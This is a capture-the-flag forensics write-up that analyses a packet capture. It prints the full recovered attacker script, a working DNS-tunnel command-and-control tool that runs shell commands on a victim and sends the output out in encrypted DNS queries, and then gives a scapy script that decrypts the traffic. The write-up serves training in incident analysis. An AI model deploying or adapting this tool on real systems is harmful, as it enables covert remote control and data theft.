---
description: 'Category: Forensics'
---

# Secure The Network v1.5

## Description

{% code overflow="wrap" %}
```
Our IDuccS have picked up some suspicious network traffic originating from one of our internal web servers. We believe that it has been compromised by Shroom agents, but are lacking the manpower to analyze the suspected traffic capture. Can you take a look at the network capture and figure out what's going on?
```
{% endcode %}

Category: Forensics

## Walkthrough

Opening up the pcap file provided, we can see that a Python script was transferred to a machine over HTTP

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption><p>Following the HTTP stream shows us the script being transferred</p></figcaption></figure>

```python
import socket
import threading
import subprocess
import base64
from dnslib import DNSRecord, QTYPE, RR, TXT, DNSHeader

KEY = "5upErS3cr3tK3y"

def encrypt_decrypt(data, key=KEY, encrypt=True):
    key_length = len(key)
    if isinstance(data, str):
        data = data.encode()
    result = bytes(b ^ ord(key[i % key_length]) for i, b in enumerate(data))
    if encrypt:
        return base64.b64encode(result).decode('utf-8')
    else:
        decoded_data = base64.b64decode(data)
        decrypted_result = bytes(
            b ^ ord(key[i % key_length]) for i, b in enumerate(decoded_data))
        return decrypted_result.decode('utf-8', errors='ignore')

# DNS Server


class DNSServer:
    def __init__(self, host='0.0.0.0', port=53):
        self.host = host
        self.port = port
        self.current_command = None
        self.client_connected = threading.Event()

    def handle_request(self, data, addr, sock):
        try:
            request = DNSRecord.parse(data)
            qname = str(request.q.qname).strip('.')
            qtype = QTYPE[request.q.qtype]

            if qtype == "TXT":
                response = DNSRecord(
                    DNSHeader(id=request.header.id, qr=1, aa=1, ra=1),
                    q=request.q
                )

                if qname.startswith("result."):
                    encrypted_result = (qname.split(
                        "result.", 1)[1]).split(".", 1)[0]
                    decrypted_result = encrypt_decrypt(
                        encrypted_result, encrypt=False)
                    print(f"Received result from client: {decrypted_result}")
                elif self.current_command:
                    encrypted_command = encrypt_decrypt(self.current_command)
                    response.add_answer(
                        RR(qname, QTYPE.TXT, rdata=TXT(
                            encrypted_command), ttl=60)
                    )
                    self.current_command = None
                else:
                    response.add_answer(
                        RR(qname, QTYPE.TXT, rdata=TXT(""), ttl=60)
                    )
                    self.client_connected.set()

                sock.sendto(response.pack(), addr)

        except Exception as e:
            print(f"Error handling request: {e}")

    def start(self):
        print(f"DNS Server running on {self.host}:{self.port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.host, self.port))

        threading.Thread(target=self.command_input_loop).start()

        while True:
            data, addr = sock.recvfrom(512)
            threading.Thread(target=self.handle_request,
                             args=(data, addr, sock)).start()

    def command_input_loop(self):
        print("Waiting for client to connect...")
        self.client_connected.wait()
        print("Client connected. Ready to receive commands.")
        while True:
            self.current_command = input(
                "Enter command to execute on client: ")

# DNS Client


class DNSClient:
    def __init__(self, server_ip, server_port=53):
        self.server_ip = server_ip
        self.server_port = server_port

    def send_message(self, domain):
        while True:
            request = DNSRecord.question(domain, qtype="TXT")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            try:
                sock.sendto(request.pack(), (self.server_ip, self.server_port))
                data, _ = sock.recvfrom(512)
                response = DNSRecord.parse(data)

                for rr in response.rr:
                    if rr.rtype == QTYPE.TXT:
                        encrypted_command = rr.rdata.data[0]
                        command = encrypt_decrypt(
                            encrypted_command, encrypt=False)

                        if command:
                            print("Executing command received from server:", command)
                            result = subprocess.run(
                                command, shell=True, capture_output=True, text=True)
                            result_output = result.stdout.strip() or result.stderr.strip()
                            encrypted_result = encrypt_decrypt(result_output)
                            result_domain = f"result.{encrypted_result.replace(' ', '_')}.{
                                domain}"
                            result_request = DNSRecord.question(
                                result_domain, qtype="TXT")
                            sock.sendto(result_request.pack(),
                                        (self.server_ip, self.server_port))

            except socket.timeout:
                pass  # Retry on timeout
            except Exception as e:
                print(f"Error: {e}")
            finally:
                sock.close()


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python exfil.py server|client")
        sys.exit(1)

    mode = sys.argv[1]

    if mode == "server":
        server = DNSServer()
        server.start()

    elif mode == "client":
        if len(sys.argv) != 4:
            print("Usage: python exfil.py client <server_ip> <domain>")
            sys.exit(1)

        server_ip = sys.argv[2]
        domain = sys.argv[3]

        client = DNSClient(server_ip)
        client.send_message(domain)

    else:
        print("Invalid mode. Use 'server' or 'client'.")

```

Reading through the script, we can infer that it is attempting to use DNS packets to exfiltrate data out of the network.&#x20;

<figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption><p>DNS traffic confirms suspicions of data exfiltration</p></figcaption></figure>

Using the exfiltration script, we can reverse engineer it to figure out how to extract and decrypt the traffic

***

### How the exfiltration script works

* On start-up, the attacker's machine listens on port 53 for any incoming DNS requests. At the same time, the victim's machine attempts to connect to the attacker
* Once the connection is established, the attacker sends commands using DNS "response" packets, which are received by the victim server and executed
* Command outputs are sent back through DNS "question" packets, which are received and displayed on the attacker machine
* Any commands and outputs that are being transmitted are first encrypted using XOR with a secret key ("5upErS3cr3tK3y") before being inserted into the packets

***

To extract the encrypted DNS traffic, we can use the scapy Python library to extract the packets stored, then filter for only DNS packets and decrypt their contents.&#x20;

We can use the following script to do just that

```python
from scapy.all import rdpcap, DNS, DNSQR, DNSRR
import tqdm
import base64

def extract_dns_requests(pcap_file):
    # Load the PCAP file
    print("Loading pcap file")
    packets = rdpcap(pcap_file)
    print("pcap file loaded")
    dns_requests = []

    # Loop through all packets in the PCAP file
    for packet in tqdm.tqdm(packets):
        # Check if the packet has a DNS layer
        if packet.haslayer(DNS):
            dns_layer = packet[DNS]

            # Check if it's a query (qr = 0)
            if dns_layer.qr == 0 and (dns_layer.qd.qtype == 16 or dns_layer.qd.qtype == 0):  # QR = 0 for Query, QTYPE = 16 for TXT
                query_name = dns_layer.qd.qname.decode().strip(".")
                dns_requests.append({
                    "type": "query",
                    "name": query_name
                })

            # Check if it's a response (qr = 1)
            elif dns_layer.qr == 1:  # QR = 1 for Response
                for i in range(dns_layer.ancount):  # Loop through all answers
                    answer = dns_layer.an[i]
                    if answer.type == 16:  # Type 16 = TXT
                        response_name = answer.rrname.decode().strip(".")
                        response_data = b"".join(answer.rdata).decode()
                        dns_requests.append({
                            "type": "response",
                            "name": response_name,
                            "data": response_data
                        })
    return dns_requests




def encrypt_decrypt(data, key="5upErS3cr3tK3y", encrypt=True):
    key_length = len(key)
    if isinstance(data, str):
        data = data.encode()
    result = bytes(b ^ ord(key[i % key_length]) for i, b in enumerate(data))
    if encrypt:
        return base64.b64encode(result).decode('utf-8')
    else:
        decoded_data = base64.b64decode(data)
        decrypted_result = bytes(
            b ^ ord(key[i % key_length]) for i, b in enumerate(decoded_data))
        return decrypted_result.decode('utf-8', errors='ignore')


if __name__ == "__main__":
    pcap_path = "capture.pcap"
    dns_data = extract_dns_requests(pcap_path)
    for entry in dns_data:
        if entry["type"] == "query":
            if "result" in entry['name']:
                print(f"DNS Query: {encrypt_decrypt(entry['name'].split('.')[1],encrypt=False)}")
        if entry["type"] == "response":
            if entry['data']:
                print(f"DNS Response: {entry['name']} -> {encrypt_decrypt(entry['data'],encrypt=False)}")
```

With this script, we can dump out the encrypted traffic and display it on the terminal

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption><p>Running the solve script</p></figcaption></figure>

## Final Notes

The Github repo link for this particular challenge can be found [here](https://github.com/Ryo-Soikutsu/Secure-The-Network/tree/main/STN-v1.5)
